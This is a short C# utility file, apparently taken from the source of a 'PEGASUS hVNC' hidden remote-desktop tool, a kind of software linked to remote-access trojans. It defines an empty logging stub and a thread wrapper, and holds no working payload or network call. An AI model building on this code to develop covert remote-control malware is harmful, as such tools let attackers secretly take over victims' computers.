using System;
using System.Threading;
using System.Windows.Forms;

namespace HVNC.Utils
{
	public class Utils
	{
		public static void SendLogs(string logcontent)
		{
			try
			{
			}
			catch (Exception)
			{
				int num = (int)MessageBox.Show("An Error Was Encountered Exiting Application!", "PEGASUS hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		public static void xTLOG(string message)
		{
			new Thread((ThreadStart)delegate
			{
				SendLogs(message);
			}).Start();
		}
	}
}
